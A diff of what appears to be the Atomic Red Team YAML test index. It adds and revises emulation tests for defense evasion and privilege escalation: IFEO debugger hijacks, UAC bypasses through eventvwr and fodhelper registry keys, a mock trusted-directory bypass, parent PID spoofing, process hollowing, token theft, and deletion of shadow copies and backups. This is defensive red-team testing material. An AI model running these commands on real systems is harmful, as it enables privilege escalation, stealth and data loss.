     - name: Delete an entire folder - Windows cmd
       description: 'Recursively delete the temporary directory and all files contained
         within it using cmd.exe
@@ -7136,34 +7401,24 @@ defense-evasion:
 '
       supported_platforms:
       - windows
-      input_arguments:
-        folder_to_delete:
-          description: Path of folder to delete
-          type: Path
-          default: C:\Windows\Temp\victim-files-cmd
       executor:
         name: command_prompt
         elevation_required: false
-        command: 'del /f /S #{folder_to_delete}
-
-'
+        command: |
+          mkdir %temp%\T1107
+          rmdir /s /q %temp%\T1107
     - name: Delete a single file - Windows PowerShell
       description: 'Delete a single file from the temporary directory using Powershell
 
 '
       supported_platforms:
       - windows
-      input_arguments:
-        file_to_delete:
-          description: Path of file to delete
-          type: Path
-          default: C:\Windows\Temp\victim-files-ps\a
       executor:
         name: powershell
         elevation_required: false
-        command: 'Remove-Item -path "#{file_to_delete}"
-
-'
+        command: |
+          New-Item $env:TEMP\T1107.txt
+          Remove-Item -path $env:TEMP\T1107.txt
     - name: Delete an entire folder - Windows PowerShell
       description: 'Recursively delete the temporary directory and all files contained
         within it using Powershell
@@ -7179,9 +7434,9 @@ defense-evasion:
       executor:
         name: powershell
         elevation_required: false
-        command: 'Remove-Item -path "#{folder_to_delete}" -recurse
-
-'
+        command: |
+          New-Item $env:TEMP\T1107 -ItemType Directory
+          Remove-Item -path $env:TEMP\T1107 -recurse
     - name: Delete VSS - vssadmin
       description: 'Delete all volume shadow copies with vssadmin.exe
 
@@ -7214,11 +7469,14 @@ defense-evasion:
       - windows
       executor:
         name: command_prompt
+        elevation_required: true
         command: |
           bcdedit /set {default} bootstatuspolicy ignoreallfailures
           bcdedit /set {default} recoveryenabled no
     - name: wbadmin
-      description: "This test deletes Windows Backup catalogs. \n"
+      description: 'This test deletes Windows Backup catalogs.
+
+'
       supported_platforms:
       - windows
       executor:
@@ -8138,6 +8396,83 @@ defense-evasion:
         command: 'sudo dscl . -create /Users/#{user_name} UniqueID 333
 
 '
+  T1143:
+    technique:
+      x_mitre_permissions_required:
+      - User
+      x_mitre_data_sources:
+      - Windows event logs
+      - PowerShell logs
+      - Process command-line parameters
+      - Process monitoring
+      - File monitoring
+      name: Hidden Window
+      description: |
+        Adversaries may implement hidden windows to conceal malicious activity from the plain sight of users. In some cases, windows that would typically be displayed when an application carries out an operation can be hidden. This may be utilized by system administrators to avoid disrupting user work environments when carrying out administrative tasks. Adversaries may abuse operating system functionality to hide otherwise visible windows from users so as not to alert the user to adversary activity on the system.
+
+        ### Windows
+        There are a variety of features in scripting languages in Windows, such as [PowerShell](https://attack.mitre.org/techniques/T1086), Jscript, and VBScript to make windows hidden. One example of this is <code>powershell.exe -WindowStyle Hidden</code>.  (Citation: PowerShell About 2019)
+
+        ### Mac
+        The configurations for how applications run on macOS are listed in property list (plist) files. One of the tags in these files can be <code>apple.awt.UIElement</code>, which allows for Java applications to prevent the application's icon from appearing in the Dock. A common use for this is when applications run in the system tray, but don't also want to show up in the Dock. However, adversaries can abuse this feature and hide their running window.(Citation: Antiquated Mac Malware)
+      id: attack-pattern--04ee0cb7-dac3-4c6c-9387-4c6aa096f4cf
+      x_mitre_platforms:
+      - macOS
+      - Windows
+      object_marking_refs:
+      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
+      x_mitre_version: '1.1'
+      type: attack-pattern
+      x_mitre_detection: Monitor processes and command-line arguments for actions
+        indicative of hidden windows. In Windows, enable and configure event logging
+        and PowerShell logging to check for the hidden window style. In MacOS, plist
+        files are ASCII text files with a specific format, so they're relatively easy
+        to parse. File monitoring can check for the <code>apple.awt.UIElement</code>
+        or any other suspicious plist tag in plist files and flag them.
+      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
+      x_mitre_contributors:
+      - Travis Smith, Tripwire
+      created: '2017-12-14T16:46:06.044Z'
+      kill_chain_phases:
+      - kill_chain_name: mitre-attack
+        phase_name: defense-evasion
+      external_references:
+      - external_id: T1143
+        source_name: mitre-attack
+        url: https://attack.mitre.org/techniques/T1143
+      - description: Wheeler, S. et al.. (2019, May 1). About PowerShell.exe. Retrieved
+          October 11, 2019.
+        source_name: PowerShell About 2019
+        url: https://docs.microsoft.com/en-us/powershell/module/Microsoft.PowerShell.Core/About/about_PowerShell_exe?view=powershell-5.1
+      - source_name: Antiquated Mac Malware
+        description: Thomas Reed. (2017, January 18). New Mac backdoor using antiquated
+          code. Retrieved July 5, 2017.
+        url: https://blog.malwarebytes.com/threat-analysis/2017/01/new-mac-backdoor-using-antiquated-code/
+      modified: '2019-10-15T22:00:58.582Z'
+      identifier: T1143
+    atomic_tests:
+    - name: Hidden Window
+      description: 'Launch PowerShell with the "-WindowStyle Hidden" argument to conceal
+        PowerShell windows by setting the WindowStyle parameter to hidden.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        powershell_command:
+          description: Command to launch calc.exe from a hidden PowerShell Window
+          type: String
+          default: powershell.exe -WindowStyle hidden calc.exe
+        powershell_process_name:
+          description: Name of the created process
+          type: string
+          default: calc
+      executor:
+        name: powershell
+        elevation_required: false
+        command: 'Start-Process #{powershell_command}
+
+'
   T1183:
     technique:
       x_mitre_data_sources:
@@ -8234,16 +8569,20 @@ defense-evasion:
         target_binary:
           description: Binary To Attach To
           type: Path
-          default: winword.exe
+          default: C:\Windows\System32\calc.exe
         payload_binary:
           description: Binary To Execute
           type: Path
-          default: cmd.exe
+          default: C:\Windows\System32\cmd.exe
       executor:
         name: command_prompt
         elevation_required: true
         command: 'REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image
           File Execution Options\#{target_binary}" /v Debugger /d "#{payload_binary}"
+
+'
+        cleanup_command: 'reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image
+          File Execution Options\#{target_binary}" /v Debugger /f
 
 '
     - name: IFEO Global Flags
@@ -8256,22 +8595,22 @@ defense-evasion:
         target_binary:
           description: Binary To Attach To
           type: Path
-          default: notepad.exe
+          default: C:\Windows\System32\notepad.exe
         payload_binary:
           description: Binary To Execute
           type: Path
-          default: cmd.exe
+          default: C:\Windows\System32\cmd.exe
       executor:
         name: command_prompt
         elevation_required: true
-        command: 'REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image
-          File Execution Options\#{target_binary}" /v GlobalFlag /t REG_DWORD /d 512
-          REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}"
-          /v ReportingMode /t REG_DWORD /d 1 REG ADD "HKLM\SOFTWARE\Microsoft\Windows
-          NT\CurrentVersion\SilentProcessExit\#{target_binary}" /v MonitorProcess
-          /d "#{payload_binary}"
-
-'
+        command: |
+          REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\#{target_binary}" /v GlobalFlag /t REG_DWORD /d 512
+          REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}" /v ReportingMode /t REG_DWORD /d 1
+          REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}" /v MonitorProcess /d "#{payload_binary}"
+        cleanup_command: |
+          reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\#{target_binary}" /v GlobalFlag /f
+          reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}" /v ReportingMode /f
+          reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}" /v MonitorProcess /f
   T1070:
     technique:
       x_mitre_data_sources:
@@ -9185,9 +9524,13 @@ defense-evasion:
       - windows
       executor:
         name: command_prompt
-        elevation_required: false
+        elevation_required: true
         command: 'reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced
           /t REG_DWORD /v HideFileExt /d 1 /f
+
+'
+        cleanup_command: 'reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced
+          /v HideFileExt /f
 
 '
     - name: Modify Registry of Local Machine - cmd
@@ -9201,6 +9544,10 @@ defense-evasion:
         elevation_required: true
         command: 'reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
           /t REG_EXPAND_SZ /v SecurityHealth /d {some_other_executable} /f
+
+'
+        cleanup_command: 'reg delete HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
+          /v SecurityHealth /f
 
 '
     - name: Modify Registry of Another User Profile
@@ -9267,9 +9614,10 @@ defense-evasion:
           [gc]::Collect()
           reg unload "HKU\$($ProfileList[$p].SID)"
     - name: Modify registry to store logon credentials
-      description: "Sets registry key that will tell windows to store plaintext passwords
+      description: 'Sets registry key that will tell windows to store plaintext passwords
         (making the system vulnerable to clear text / cleartext password dumping)
-        \n"
+
+'
       supported_platforms:
       - windows
       executor:
@@ -9313,7 +9661,9 @@ defense-evasion:
           $EncodedCommand
           Set-ItemProperty -Force -Path #{registry_key_storage} -Name #{registry_entry_storage} -Value $EncodedCommand
         cleanup_command: 'Remove-ItemProperty -Force -Path -Path #{registry_key_storage}
-          -Name #{registry_entry_storage}'
+          -Name #{registry_entry_storage}
+
+'
   T1170:
     technique:
       x_mitre_data_sources:
@@ -9861,6 +10211,118 @@ defense-evasion:
           -Name #{registry_entry_storage}
 
 '
+  T1502:
+    technique:
+      x_mitre_data_sources:
+      - Windows event logs
+      - Process monitoring
+      - API monitoring
+      x_mitre_permissions_required:
+      - User
+      - Administrator
+      name: Parent PID Spoofing
+      description: |-
+        Adversaries may spoof the parent process identifier (PPID) of a new process to evade process-monitoring defenses or to elevate privileges. New processes are typically spawned directly from their parent, or calling, process unless explicitly specified. One way of explicitly assigning the PPID of a new process is via the <code>CreateProcess</code> API call, which supports a parameter that defines the PPID to use.(Citation: DidierStevens SelectMyParent Nov 2009) This functionality is used by Windows features such as User Account Control (UAC) to correctly set the PPID after a requested elevated process is spawned by SYSTEM (typically via <code>svchost.exe</code> or <code>consent.exe</code>) rather than the current user context.(Citation: Microsoft UAC Nov 2018)
+
+        Adversaries may abuse these mechanisms to evade defenses, such as those blocking processes spawning directly from Office documents, and analysis targeting unusual/potentially malicious parent-child process relationships, such as spoofing the PPID of [PowerShell](https://attack.mitre.org/techniques/T1086)/[Rundll32](https://attack.mitre.org/techniques/T1085) to be <code>explorer.exe</code> rather than an Office document delivered as part of [Spearphishing Attachment](https://attack.mitre.org/techniques/T1193).(Citation: CounterCept PPID Spoofing Dec 2018) This spoofing could be executed via VBA [Scripting](https://attack.mitre.org/techniques/T1064) within a malicious Office document or any code that can perform [Execution through API](https://attack.mitre.org/techniques/T1106).(Citation: CTD PPID Spoofing Macro Mar 2019)(Citation: CounterCept PPID Spoofing Dec 2018)
+
+        Explicitly assigning the PPID may also enable [Privilege Escalation](https://attack.mitre.org/tactics/TA0004) (given appropriate access rights to the parent process). For example, an adversary in a privileged user context (i.e. administrator) may spawn a new process and assign the parent as a process running as SYSTEM (such as <code>lsass.exe</code>), causing the new process to be elevated via the inherited access token.(Citation: XPNSec PPID Nov 2017)
+      id: attack-pattern--9ddc2534-e91c-4dab-a8f6-43dab81e8142
+      modified: '2019-07-08T21:51:22.635Z'
+      x_mitre_platforms:
+      - Windows
+      object_marking_refs:
+      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
+      x_mitre_version: '1.0'
+      type: attack-pattern
+      x_mitre_detection: |-
+        Look for inconsistencies between the various fields that store PPID information, such as the EventHeader ProcessId from data collected via Event Tracing for Windows (ETW), Creator Process ID/Name from Windows event logs, and the ProcessID and ParentProcessID (which are also produced from ETW and other utilities such as Task Manager and Process Explorer). The ETW provided EventHeader ProcessId identifies the actual parent process.(Citation: CounterCept PPID Spoofing Dec 2018)
+
+        Monitor and analyze API calls to <code>CreateProcess</code>/<code>CreateProcessA</code>, specifically those from user/potentially malicious processes and with parameters explicitly assigning PPIDs (ex: the Process Creation Flags of 0x8XXX, indicating that the process is being created with extended startup information(Citation: Microsoft Process Creation Flags May 2018)). Malicious use of <code>CreateProcess</code>/<code>CreateProcessA</code> may also be proceeded by a call to <code>UpdateProcThreadAttribute</code>, which may be necessary to update process creation attributes.(Citation: Secuirtyinbits Ataware3 May 2019) This may generate false positives from normal UAC elevation behavior, so compare to a system baseline/understanding of normal system activity if possible.
+      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
+      x_mitre_contributors:
+      - Wayne Silva, Countercept
+      created: '2019-06-03T14:50:50.613Z'
+      kill_chain_phases:
+      - phase_name: defense-evasion
+        kill_chain_name: mitre-attack
+      - phase_name: privilege-escalation
+        kill_chain_name: mitre-attack
+      external_references:
+      - external_id: T1502
+        source_name: mitre-attack
+        url: https://attack.mitre.org/techniques/T1502
+      - source_name: DidierStevens SelectMyParent Nov 2009
+        description: 'Stevens, D. (2009, November 22). Quickpost: SelectMyParent or
+          Playing With the Windows Process Tree. Retrieved June 3, 2019.'
+        url: https://blog.didierstevens.com/2009/11/22/quickpost-selectmyparent-or-playing-with-the-windows-process-tree/
+      - source_name: Microsoft UAC Nov 2018
+        description: Montemayor, D. et al.. (2018, November 15). How User Account
+          Control works. Retrieved June 3, 2019.
+        url: https://docs.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works
+      - source_name: CounterCept PPID Spoofing Dec 2018
+        description: Loh, I. (2018, December 21). Detecting Parent PID Spoofing. Retrieved
+          June 3, 2019.
+        url: https://www.countercept.com/blog/detecting-parent-pid-spoofing/
+      - source_name: CTD PPID Spoofing Macro Mar 2019
+        description: Tafani-Dereeper, C. (2019, March 12). Building an Office macro
+          to spoof parent processes and command line arguments. Retrieved June 3,
+          2019.
+        url: https://blog.christophetd.fr/building-an-office-macro-to-spoof-process-parent-and-command-line/
+      - source_name: XPNSec PPID Nov 2017
+        description: Chester, A. (2017, November 20). Alternative methods of becoming
+          SYSTEM. Retrieved June 4, 2019.
+        url: https://blog.xpnsec.com/becoming-system/
+      - description: Schofield, M. & Satran, M. (2018, May 30). Process Creation Flags.
+          Retrieved June 4, 2019.
+        source_name: Microsoft Process Creation Flags May 2018
+        url: https://docs.microsoft.com/windows/desktop/ProcThread/process-creation-flags
+      - source_name: Secuirtyinbits Ataware3 May 2019
+        description: Secuirtyinbits . (2019, May 14). Parent PID Spoofing (Stage 2)
+          Ataware Ransomware Part 3. Retrieved June 6, 2019.
+        url: https://www.securityinbits.com/malware-analysis/parent-pid-spoofing-stage-2-ataware-ransomware-part-3
+      x_mitre_defense_bypassed:
+      - Host forensic analysis
+      - Heuristic Detection
+      identifier: T1502
+    atomic_tests:
+    - name: Parent PID Spoofing using PowerShell
+      description: |
+        This test uses PowerShell to replicates how Cobalt Strike does ppid spoofing and masquerade a spawned process.
+        Credit to In Ming Loh (https://github.com/countercept/ppid-spoofing/blob/master/PPID-Spoof.ps1)
+      supported_platforms:
+      - windows
+      input_arguments:
+        parent_process_name:
+          description: Name of the parent process
+          type: string
+          default: explorer
+        dll_path:
+          description: Path of the dll to inject
+          type: string
+          default: "$PathToAtomicsFolder\\T1502\\bin\\calc.dll"
+        dll_process_name:
+          description: Name of the created process from the injected dll
+          type: string
+          default: calculator
+        spawnto_process_path:
+          description: Path of the process to spawn
+          type: string
+          default: C:\Program Files\Internet Explorer\iexplore.exe
+        spawnto_process_name:
+          description: Name of the process to spawn
+          type: string
+          default: iexplore
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          . $PathToAtomicsFolder\T1502\src\PPID-Spoof.ps1
+          $ppid=Get-Process #{parent_process_name} | select -expand id
+          PPID-Spoof -ppid $ppid -spawnto "#{spawnto_process_path}" -dllpath "#{dll_path}"
+        cleanup_command: |-
+          Stop-Process -Name "#{dll_process_name}"
+          Stop-Process -Name "#{spawnto_process_name}"
   T1150:
     technique:
       x_mitre_data_sources:
@@ -9935,6 +10397,89 @@ defense-evasion:
               ~/Library/Preferences
 
           2. Subsequently, follow the steps for adding and running via [Launch Agent](Persistence/Launch_Agent.md)
+  T1093:
+    technique:
+      x_mitre_data_sources:
+      - Process monitoring
+      - API monitoring
+      x_mitre_permissions_required:
+      - User
+      name: Process Hollowing
+      description: 'Process hollowing occurs when a process is created in a suspended
+        state then its memory is unmapped and replaced with malicious code. Similar
+        to [Process Injection](https://attack.mitre.org/techniques/T1055), execution
+        of the malicious code is masked under a legitimate process and may evade defenses
+        and detection analysis. (Citation: Leitch Hollowing) (Citation: Endgame Process
+        Injection July 2017)'
+      id: attack-pattern--1c338d0f-a65e-4073-a5c1-c06878849f21
+      x_mitre_platforms:
+      - Windows
+      object_marking_refs:
+      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
+      x_mitre_version: '1.0'
+      type: attack-pattern
+      kill_chain_phases:
+      - kill_chain_name: mitre-attack
+        phase_name: defense-evasion
+      x_mitre_detection: |-
+        Monitoring API calls may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. API calls that unmap process memory, such as ZwUnmapViewOfSection or NtUnmapViewOfSection, and those that can be used to modify memory within another process, such as WriteProcessMemory, may be used for this technique. (Citation: Endgame Process Injection July 2017)
+
+        Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior.
+      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
+      created: '2017-05-31T21:31:09.815Z'
+      modified: '2018-10-17T00:14:20.652Z'
+      external_references:
+      - external_id: T1093
+        source_name: mitre-attack
+        url: https://attack.mitre.org/techniques/T1093
+      - description: Leitch, J. (n.d.). Process Hollowing. Retrieved November 12,
+          2014.
+        source_name: Leitch Hollowing
+        url: http://www.autosectools.com/process-hollowing.pdf
+      - description: 'Hosseini, A. (2017, July 18). Ten Process Injection Techniques:
+          A Technical Survey Of Common And Trending Process Injection Techniques.
+          Retrieved December 7, 2017.'
+        source_name: Endgame Process Injection July 2017
+        url: https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process
+      x_mitre_defense_bypassed:
+      - Process whitelisting
+      - Whitelisting by file name or path
+      - Signature-based detection
+      - Anti-virus
+      identifier: T1093
+    atomic_tests:
+    - name: Process Hollowing using PowerShell
+      description: |
+        This test uses PowerShell to create a Hollow from a PE on disk with explorer as the parent.
+        Credit to FuzzySecurity (https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Start-Hollow.ps1)
+      supported_platforms:
+      - windows
+      input_arguments:
+        parent_process_name:
+          description: Name of the parent process
+          type: string
+          default: explorer
+        sponsor_binary_path:
+          description: Path of the sponsor binary (executable that will host the binary)
+          type: string
+          default: C:\Windows\System32\calc.exe
+        hollow_binary_path:
+          description: Path of the binary to hollow (executable that will run inside
+            the sponsor)
+          type: string
+          default: C:\Windows\System32\cmd.exe
+        spawnto_process_name:
+          description: Name of the process to spawn
+          type: string
+          default: calc
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          . $PathToAtomicsFolder\T1093\src\Start-Hollow.ps1
+          $ppid=Get-Process #{parent_process_name} | select -expand id
+          Start-Hollow -Sponsor "#{sponsor_binary_path}" -Hollow "#{hollow_binary_path}" -ParentPID $ppid -Verbose
+        cleanup_command: Stop-Process -Name "#{spawnto_process_name}"
   T1055:
     technique:
       x_mitre_permissions_required:
@@ -10283,7 +10828,9 @@ defense-evasion:
         command: |
           C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /target:library #{source_file}
           C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U #{file_name}
-          del #{file_name}
+        cleanup_command: 'del #{file_name}
+
+'
     - name: Regsvs Uninstall Method Call Test
       description: 'Executes the Uninstall Method, No Admin Rights Required, Requires
         SNK
@@ -10309,6 +10856,7 @@ defense-evasion:
           Set-Content key.snk -Value $Content -Encoding Byte
           C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /target:library /keyfile:key.snk #{source_file}
           C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe #{file_name}
+        cleanup_command: |
           del #{file_name}
           del key.snk
   T1117:
@@ -11592,7 +12140,7 @@ defense-evasion:
         filename:
           description: Location of the project file
           type: Path
-          default: T1127.csproj
+          default: PathToAtomicsFolder\T1127\T1127.csproj
       executor:
         name: command_prompt
         elevation_required: false
@@ -12017,12 +12565,13 @@ privilege-escalation:
         elevation_required: true
         command: |
           #list processes by user,
-
           $owners = @{}
           gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user}
           get-process | select processname,Id,@{l="Owner";e={$owners[$_.id.tostring()]}}
+
           #Steal Token
-          . .\src\T1134.ps1
+          Set-Location $PathToAtomicsFolder
+          .\T1134\src\T1134.ps1
   T1015:
     technique:
       x_mitre_permissions_required:
@@ -12679,6 +13228,9 @@ privilege-escalation:
         command: |
           reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d "#{executable_binary}" /f
           cmd.exe /c eventvwr.msc
+        cleanup_command: 'reg.exe delete hkcu\software\classes\mscfile /f
+
+'
     - name: Bypass UAC using Event Viewer - PowerShell
       description: 'PowerShell code to bypass User Account Control using Event Viewer
         and a relevant Windows Registry modification. More information here - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/
@@ -12697,6 +13249,9 @@ privilege-escalation:
           New-Item "HKCU:\software\classes\mscfile\shell\open\command" -Force
           Set-ItemProperty "HKCU:\software\classes\mscfile\shell\open\command" -Name "(default)" -Value "#{executable_binary}" -Force
           Start-Process "C:\Windows\System32\eventvwr.msc"
+        cleanup_command: 'Remove-Item "HKCU:\software\classes\mscfile" -force -Recurse
+
+'
     - name: Bypass UAC using Fodhelper
       description: 'Bypasses User Account Control using the Windows 10 Features on
         Demand Helper (fodhelper.exe). Requires Windows 10.
@@ -12716,6 +13271,9 @@ privilege-escalation:
           reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d "#{executable_binary}" /f
           reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute"
           fodhelper.exe
+        cleanup_command: 'reg.exe delete hkcu\software\classes\ms-settings /f
+
+'
     - name: Bypass UAC using Fodhelper - PowerShell
       description: 'PowerShell code to bypass User Account Control using the Windows
         10 Features on Demand Helper (fodhelper.exe). Requires Windows 10.
@@ -12760,7 +13318,33 @@ privilege-escalation:
           New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
           Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "#{executable_binary}" -Force
           Start-Process "C:\Windows\System32\ComputerDefaults.exe"
-        cleanup_command: Remove-Item "HKCU:\software\classes\ms-settings" -force -Recurse
+        cleanup_command: 'Remove-Item "HKCU:\software\classes\ms-settings" -force
+          -Recurse
+
+'
+    - name: Bypass UAC by Mocking Trusted Directories
+      description: 'Creates a fake "trusted directory" and copies a binary to bypass
+        UAC. The UAC bypass may not work on fully patched systems, however the directory
+        structure will be created.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        executable_binary:
+          description: Binary to execute with UAC Bypass
+          type: path
+          default: C:\Windows\System32\cmd.exe
+      executor:
+        name: command_prompt
+        elevation_required: true
+        command: |
+          mkdir "\\?\C:\Windows \System32\"
+          copy "#{executable_binary}" "\\?\C:\Windows \System32\mmc.exe"
+          mklink c:\testbypass.exe "\\?\C:\Windows \System32\mmc.exe"
+        cleanup_command: |
+          rd "\\?\C:\Windows \" /S /Q
+          del "c:\testbypass.exe"
   T1038:
     technique:
       x_mitre_permissions_required:
@@ -12872,11 +13456,14 @@ privilege-escalation:
       - windows
       executor:
         name: command_prompt
-        elevation_required: false
+        elevation_required: true
         command: |
           copy %windir%\System32\windowspowershell\v1.0\powershell.exe %APPDATA%\updater.exe
           copy %windir%\System32\amsi.dll %APPDATA%\amsi.dll
-          cmd.exe /k %APPDATA%\updater.exe
+          %APPDATA%\updater.exe -Command exit
+        cleanup_command: |
+          del %APPDATA%\updater.exe
+          del %APPDATA%\amsi.dll
   T1044:
     technique:
       x_mitre_permissions_required:
@@ -13099,7 +13686,7 @@ privilege-escalation:
         file_name:
           description: Dll To Inject
           type: Path
-          default: C:\AtomicRedTeam\atomics\T1179\bin\T1179x64.dll
+          default: PathToAtomicsFolder\T1179\bin\T1179x64.dll
         server_name:
           description: TLS Server To Test Get Request
           type: Url
@@ -13206,16 +13793,20 @@ privilege-escalation:
         target_binary:
           description: Binary To Attach To
           type: Path
-          default: winword.exe
+          default: C:\Windows\System32\calc.exe
         payload_binary:
           description: Binary To Execute
           type: Path
-          default: cmd.exe
+          default: C:\Windows\System32\cmd.exe
       executor:
         name: command_prompt
         elevation_required: true
         command: 'REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image
           File Execution Options\#{target_binary}" /v Debugger /d "#{payload_binary}"
+
+'
+        cleanup_command: 'reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image
+          File Execution Options\#{target_binary}" /v Debugger /f
 
 '
     - name: IFEO Global Flags
@@ -13228,22 +13819,22 @@ privilege-escalation:
         target_binary:
           description: Binary To Attach To
           type: Path
-          default: notepad.exe
+          default: C:\Windows\System32\notepad.exe
         payload_binary:
           description: Binary To Execute
           type: Path
-          default: cmd.exe
+          default: C:\Windows\System32\cmd.exe
       executor:
         name: command_prompt
         elevation_required: true
-        command: 'REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image
-          File Execution Options\#{target_binary}" /v GlobalFlag /t REG_DWORD /d 512
-          REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}"
-          /v ReportingMode /t REG_DWORD /d 1 REG ADD "HKLM\SOFTWARE\Microsoft\Windows
-          NT\CurrentVersion\SilentProcessExit\#{target_binary}" /v MonitorProcess
-          /d "#{payload_binary}"
-
-'
+        command: |
+          REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\#{target_binary}" /v GlobalFlag /t REG_DWORD /d 512
+          REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}" /v ReportingMode /t REG_DWORD /d 1
+          REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}" /v MonitorProcess /d "#{payload_binary}"
+        cleanup_command: |
+          reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\#{target_binary}" /v GlobalFlag /f
+          reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}" /v ReportingMode /f
+          reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}" /v MonitorProcess /f
   T1160:
     technique:
       x_mitre_permissions_required:
@@ -13456,6 +14047,118 @@ privilege-escalation:
         cleanup_command: |
           Stop-Service -Name "#{service_name}"
           (Get-WmiObject Win32_Service -filter "name='#{service_name}'").Delete()
+  T1502:
+    technique:
+      x_mitre_data_sources:
+      - Windows event logs
+      - Process monitoring
+      - API monitoring
+      x_mitre_permissions_required:
+      - User
+      - Administrator
+      name: Parent PID Spoofing
+      description: |-
+        Adversaries may spoof the parent process identifier (PPID) of a new process to evade process-monitoring defenses or to elevate privileges. New processes are typically spawned directly from their parent, or calling, process unless explicitly specified. One way of explicitly assigning the PPID of a new process is via the <code>CreateProcess</code> API call, which supports a parameter that defines the PPID to use.(Citation: DidierStevens SelectMyParent Nov 2009) This functionality is used by Windows features such as User Account Control (UAC) to correctly set the PPID after a requested elevated process is spawned by SYSTEM (typically via <code>svchost.exe</code> or <code>consent.exe</code>) rather than the current user context.(Citation: Microsoft UAC Nov 2018)
+
+        Adversaries may abuse these mechanisms to evade defenses, such as those blocking processes spawning directly from Office documents, and analysis targeting unusual/potentially malicious parent-child process relationships, such as spoofing the PPID of [PowerShell](https://attack.mitre.org/techniques/T1086)/[Rundll32](https://attack.mitre.org/techniques/T1085) to be <code>explorer.exe</code> rather than an Office document delivered as part of [Spearphishing Attachment](https://attack.mitre.org/techniques/T1193).(Citation: CounterCept PPID Spoofing Dec 2018) This spoofing could be executed via VBA [Scripting](https://attack.mitre.org/techniques/T1064) within a malicious Office document or any code that can perform [Execution through API](https://attack.mitre.org/techniques/T1106).(Citation: CTD PPID Spoofing Macro Mar 2019)(Citation: CounterCept PPID Spoofing Dec 2018)
+
+        Explicitly assigning the PPID may also enable [Privilege Escalation](https://attack.mitre.org/tactics/TA0004) (given appropriate access rights to the parent process). For example, an adversary in a privileged user context (i.e. administrator) may spawn a new process and assign the parent as a process running as SYSTEM (such as <code>lsass.exe</code>), causing the new process to be elevated via the inherited access token.(Citation: XPNSec PPID Nov 2017)
+      id: attack-pattern--9ddc2534-e91c-4dab-a8f6-43dab81e8142
+      modified: '2019-07-08T21:51:22.635Z'
+      x_mitre_platforms:
+      - Windows
+      object_marking_refs:
+      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
+      x_mitre_version: '1.0'
+      type: attack-pattern
+      x_mitre_detection: |-
+        Look for inconsistencies between the various fields that store PPID information, such as the EventHeader ProcessId from data collected via Event Tracing for Windows (ETW), Creator Process ID/Name from Windows event logs, and the ProcessID and ParentProcessID (which are also produced from ETW and other utilities such as Task Manager and Process Explorer). The ETW provided EventHeader ProcessId identifies the actual parent process.(Citation: CounterCept PPID Spoofing Dec 2018)
+
